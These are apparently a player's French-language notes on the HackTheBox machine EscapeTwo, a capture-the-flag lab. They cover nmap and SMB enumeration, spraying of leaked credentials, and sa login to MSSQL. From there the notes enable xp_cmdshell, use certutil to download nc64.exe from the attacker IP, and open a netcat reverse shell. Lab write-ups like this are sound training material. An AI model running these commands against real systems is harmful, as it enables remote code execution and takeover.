# Notes

```bash
nmap -Pn -sC -sV -oA scan-10.10.11.51 10.10.11.51           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 18:56 CEST
Nmap scan report for 10.10.11.51
Host is up (0.075s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 16:56:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-14T16:58:25+00:00; -6s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-14T16:55:15
|_Not valid after:  2055-07-14T16:55:15
|_ssl-date: 2025-07-14T16:58:25+00:00; -1s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-14T16:58:25+00:00; -3s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-14T16:58:25+00:00; -3s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-14T16:57:46
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 2s, median: -3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.88 seconds
```

Domain: sequel.htb0
Machine: DC01.sequel.htb

On peut la rajouter aux known hosts pour le cache DNS:
```bash
echo "10.10.11.51 sequel.htb dc01.sequel.htb" | sudo tee -a /etc/hosts
```

```bash
HTB nxc smb --shares -u 'rose' -p 'KxEPkKe6R8su' -d 'sequel.htb' 10.10.11.51                                     

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ    

smbclient.py rose:'KxEPkKe6R8su'@10.10.11.51
```

```bash
First Name 	Last Name 	Email 	Username 	Password
Angela 	Martin 	angela@sequel.htb 	angela 	0fwz7Q4mSpurIt99
Oscar 	Martinez 	oscar@sequel.htb 	oscar 	86LxLBMgEWaKUnBG
Kevin 	Malone 	kevin@sequel.htb 	kevin 	Md9Wlq1E5bZnVDVo
NULL 	NULL 	sa@sequel.htb 	sa 	MSSQLP@ssw0rd!
```

On trouve finalement que oscar est un utilisateur du domaine.
```bash
➜  EscapeTwo git:(main) ✗ nxc smb --shares -u 'sa' -p 'MSSQLP@ssw0rd!' -d 'sequel.htb' 10.10.11.51    
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
➜  EscapeTwo git:(main) ✗ nxc smb --shares -u 'kevin' -p 'Md9Wlq1E5bZnVDVo' -d 'sequel.htb' 10.10.11.51    
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
➜  EscapeTwo git:(main) ✗ nxc smb --shares -u 'oscar' -p '86LxLBMgEWaKUnBG' -d 'sequel.htb' 10.10.11.51    
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ            
➜  EscapeTwo git:(main) ✗ nxc smb --shares -u 'angela' -p '0fwz7Q4mSpurIt99' -d 'sequel.htb' 10.10.11.51
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
```

```bash
bloodhound-python -c All -u 'ocar' -p '86LxLBMgEWaKUnBG' -d sequel.htb -dc 10.10.11.51
```
Donne rien

On peut utiliser les credentials du compte sa sur mysql:
```bash
mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.10.11.51
```

```sql
SQL (sa  dbo@master)> select @@version
                                                                                                                                                                                                                           
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
	Sep 24 2019 13:48:23 
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)


EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'whoami'

sequel\sql_svc

EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.29:4000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
output                                                
---------------------------------------------------   
****  Online  ****                                    

  0000  ...                                           

  aab0                                                

CertUtil: -URLCache command completed successfully.   

NULL        
```
On a dl nc64.exe sur le serveur Windows, on peut maintenant l'utiliser.

Ensuite on peut ouvrir un listener nc:
```bash
nc -lnvp 4444
```

```sql
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.29 4444';
```